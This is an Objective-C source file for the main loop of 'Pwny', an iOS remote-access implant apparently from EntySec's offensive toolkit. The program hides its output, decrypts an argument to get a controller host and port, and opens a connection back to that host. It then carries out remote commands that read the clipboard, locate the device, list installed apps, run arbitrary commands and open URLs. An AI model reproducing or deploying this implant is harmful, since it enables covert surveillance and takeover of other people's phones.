/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#import "crypto.h"
#import "pwny.h"

#import "channel.h"
#import "utils.h"

Channel *channel = [[Channel alloc] init];
Utils *utils = [[Utils alloc] init];

void interactPipe(int channelPipe) {
    Pwny *pwny = [[Pwny alloc] init:channelPipe];

    while (YES) {
        NSString *inputString = [channel readChannel:channelPipe];

        NSData *jsonData = [inputString dataUsingEncoding:NSUTF8StringEncoding];
        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];

        NSString *cmd = [jsonDict objectForKey:@"cmd"];
        NSString *args = [jsonDict objectForKey:@"args"];

        if ([cmd isEqualToString:@"sysinfo"])
            [pwny cmd_sysinfo];
        else if ([cmd isEqualToString:@"getpid"])
            [pwny cmd_getpid];
        else if ([cmd isEqualToString:@"getpaste"])
            [pwny cmd_getpaste];
        else if ([cmd isEqualToString:@"battery"])
            [pwny cmd_battery];
        else if ([cmd isEqualToString:@"getvol"])
            [pwny cmd_getvol];
        else if ([cmd isEqualToString:@"locate"])
            [pwny cmd_locate];
        else if ([cmd isEqualToString:@"vibrate"])
            [pwny cmd_vibrate];
        else if ([cmd isEqualToString:@"bundleids"])
            [pwny cmd_bundleids];
        else if ([cmd isEqualToString:@"exec"])
            [pwny cmd_exec:args];
        else if ([cmd isEqualToString:@"say"])
            [pwny cmd_say:args];
        else if ([cmd isEqualToString:@"setvol"])
            [pwny cmd_setvol:args];
        else if ([cmd isEqualToString:@"player"])
            [pwny cmd_player:args];
        else if ([cmd isEqualToString:@"openapp"])
            [pwny cmd_openapp:args];
        else if ([cmd isEqualToString:@"openurl"])
            [pwny cmd_openurl:args];
        else if ([cmd isEqualToString:@"chdir"])
            [pwny cmd_chdir:args];
        else if ([cmd isEqualToString:@"exit"])
            break;
    }
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        if (argc > 1) {
            [utils redirectToNull];

            Crypto *crypto = [[Crypto alloc] init];

            NSString *inputData = [NSString stringWithFormat:@"%s", argv[1]];
            NSString *decodedData = [crypto decrypt:inputData];

            NSData *jsonData = [decodedData dataUsingEncoding:NSUTF8StringEncoding];
            NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];

            NSString *host = [jsonDict objectForKey:@"host"];
            NSString *port = [jsonDict objectForKey:@"port"];

            int channelPipe = [channel openChannel:host withPort:[port integerValue]];
            if (channelPipe < 0)
                return -1;

            interactPipe(channelPipe);
            [channel closeChannel:channelPipe];
        } else
            return -1;
    }
    return 0;
}
